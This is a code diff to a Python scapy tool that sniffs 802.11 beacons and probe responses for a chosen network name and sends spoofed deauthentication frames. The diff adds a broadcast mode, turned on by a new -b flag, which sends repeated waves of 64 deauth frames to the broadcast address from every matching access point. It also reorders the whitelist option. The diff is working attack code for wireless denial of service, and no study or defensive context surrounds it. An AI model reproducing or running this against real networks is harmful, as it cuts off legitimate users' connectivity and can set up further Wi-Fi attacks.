@@ -22,6 +22,7 @@ BPF_DOT11_PROBE_REQ = 'wlan type mgt subtype probe-req'
 BPF_DOT11_PROBE_RESP = 'wlan type mgt subtype probe-resp'
 BPF_DOT11_CONTROL =  'wlan type ctl'
 BPF_DOT11_DATA = 'wlan type data'
+BROADCAST = 'ff:ff:ff:ff:ff:ff'
 DEAUTH_COUNT = 64
 
 class MsgException(Exception):
@@ -130,9 +131,24 @@ def unicast_deauth(deauth_waves, deauth_socket, bssid_sta, bssid_ap, bssid_netwo
                     dot11.Dot11Deauth(reason = 7)
                 )
     except Exception as e:
-        raise MsgException(e, 'Deauthentication frames could not be sent')
+        raise MsgException(e, 'Unicast deauthentication frames could not be sent')
 
-def sniffer_wrapper(wifi_essid, bssids_whitelist, deauth_waves, deauth_socket, bssids_aps_dict, bssids_stas_dict):
+def broadcast_deauth(deauth_waves, deauth_socket, bssid_ap, bssid_network):
+    '''broadcast deauthentication'''
+    
+    try:
+        print_info(f'sending {deauth_waves} x {DEAUTH_COUNT} broadcast deauthentication frames from AP {bssid_ap} ...')
+        for i in range(deauth_waves):
+            for i in range(DEAUTH_COUNT):
+                 deauth_socket.send(
+                    dot11.RadioTap() /
+                    dot11.Dot11(addr1 = BROADCAST, addr2 = bssid_ap, addr3 = bssid_network) /
+                    dot11.Dot11Deauth(reason = 7)
+                )
+    except Exception as e:
+        raise MsgException(e, 'Broadcast deauthentication frames could not be sent')
+
+def sniffer_wrapper(wifi_essid, broadcast_enabled, deauth_waves, bssids_whitelist, deauth_socket, bssids_aps_dict, bssids_stas_dict):
     def sniffer_handler(frame):
         '''sniffed frame processing'''
         
@@ -148,6 +164,8 @@ def sniffer_wrapper(wifi_essid, bssids_whitelist, deauth_waves, deauth_socket, b
                             if dot11_element.ID == 0:
                                 if dot11_element.info and (dot11_element.info == bytes(wifi_essid, 'utf-8')):
                                     register_ap(wifi_essid, bssid_src, bssid_network, bssids_aps_dict)
+                                    if broadcast_enabled:
+                                        broadcast_deauth(deauth_waves, deauth_socket, bssid_src, bssid_network)
                                 break
                             dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
                 
@@ -159,6 +177,8 @@ def sniffer_wrapper(wifi_essid, bssids_whitelist, deauth_waves, deauth_socket, b
                             if dot11_element.ID == 0:
                                 if dot11_element.info and (dot11_element.info == bytes(wifi_essid, 'utf-8')):
                                     register_ap(wifi_essid, bssid_dst, bssid_network, bssids_aps_dict)
+                                    if broadcast_enabled:
+                                        broadcast_deauth(deauth_waves, deauth_socket, bssid_dst, bssid_network)
                                 break
                             dot11_element = dot11_element.payload.getlayer(dot11.Dot11Elt)
                 
@@ -193,12 +213,11 @@ def main():
             required = True,
         )
         parser.add_argument(
-            '-wl',
-            dest = 'bssids_whitelist',
-            help = 'Comma-separated BSSIDs whitelist',
+            '-b',
+            dest = 'broadcast_enabled',
+            help = 'Broadcast deauthentication flag',
             required = False,
-            type = bssids_whitelist_type,
-            default = [],
+            action = 'store_true',
         )
         parser.add_argument(
             '-n',
@@ -207,6 +226,14 @@ def main():
             required = False,
             type = int,
             default = 1,
+        )
+        parser.add_argument(
+            '-wl',
+            dest = 'bssids_whitelist',
+            help = 'Comma-separated BSSIDs whitelist',
+            required = False,
+            type = bssids_whitelist_type,
+            default = [],
         )
         args = parser.parse_args()
         bssids_aps_dict = {} # {ap bssid: network bssid}
@@ -222,8 +249,9 @@ def main():
                 BPF_DOT11_DATA,
             prn = sniffer_wrapper(
                 args.wifi_essid,
-                args.bssids_whitelist,
+                args.broadcast_enabled,
                 args.deauth_waves,
+                args.bssids_whitelist,
                 deauth_socket,
                 bssids_aps_dict,
                 bssids_stas_dict,
